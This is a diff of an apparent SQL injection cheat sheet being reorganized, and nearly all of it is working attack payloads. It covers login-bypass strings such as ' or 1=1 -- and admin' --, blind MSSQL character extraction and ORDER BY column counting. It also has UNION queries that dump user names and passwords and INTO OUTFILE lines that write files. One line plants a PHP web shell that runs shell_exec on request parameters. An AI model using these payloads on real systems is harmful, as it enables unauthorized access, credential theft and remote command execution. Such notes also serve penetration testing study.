@@ -2,20 +2,24 @@
 
 SQLI methodology
     Test error based sending ' " ; and look for errors.
-    Test for boolean based sending ' or '1'='1 and look for differences. Other payloads:
-        2' or '1'='1
-        ' or 1=1 --
-        a' or 1=1 --
-        " or 1=1 --
-        a" or 1=1 --
-        ' or 1=1 #
-        " or 1=1 #
-        or 1=1 --
-        ' or 'x'='x
-        " or "x"="x
-        ') or ('x'='x
-        ") or ("x"="x
-        ' or username LIKE '%admin%
+    Test for boolean based sending ' or '1'='1 and look for differences.
+    Other payloads:
+    *2' or '1'='1
+    ' or 1=1 --
+    a' or 1=1 --
+    " or 1=1 --
+    a" or 1=1 --
+    ' or 1=1 #
+    " or 1=1 #
+    or 1=1 --
+    ' or 'x'='x
+    " or "x"="x
+    ') or ('x'='x
+    ") or ("x"="x
+    ' or username LIKE '%admin%*
+    Payloads, log in as admin
+    *' or ( 1=1 and username='admin');
+    admin' --*
 
 MsSql attacks
     Group by + having can be used to specify a search condition for a group and aggregate the result.
@@ -40,9 +44,11 @@ Blind MsSqlI
         AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
     if it is true, we know the db_name starts with 109 (m).
 
-MySql injection, ORDERY BY operator
-    Displays the result sorted by specific column name or number
-    You can inject 'order by 10 #' and if the table has 10 or more tables it will order it, if it has less will throw error.
+
+Find number of columns using ORDER BY
+    We can use order by to sort the result by a given column number, if the column does not exist, we will get an error:
+    *vuln.php?id=1 order by 9 # This throws no error
+vuln.php?id=1 order by 10 # This throws error*
 
 MySql injection, UNION operator
     Joins the result of two queries
@@ -58,9 +64,6 @@ MySql injection, UNION operator
     Write files
         AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
 
-form to log in as admin
-    ' or ( 1=1 and username='admin');
-    admin' --
 
 Tricks to read data
     Exfiltrate the different rows of the table. First, find the number of rows in the table:
@@ -127,12 +130,6 @@ MySql in-band, union based SQLI exploitation
     *id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users*
     Getting a shell
     *?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'*
-
-
-SQLi find number of columns using order by
-    We can use order by to order the result by a given column, if the column does not exist, we will get an error:
-    *vuln.php?id=1 order by 9 # This trhows no error
-vuln.php?id=1 order by 10 # This throws error*
 
 
 SQLI login bypass
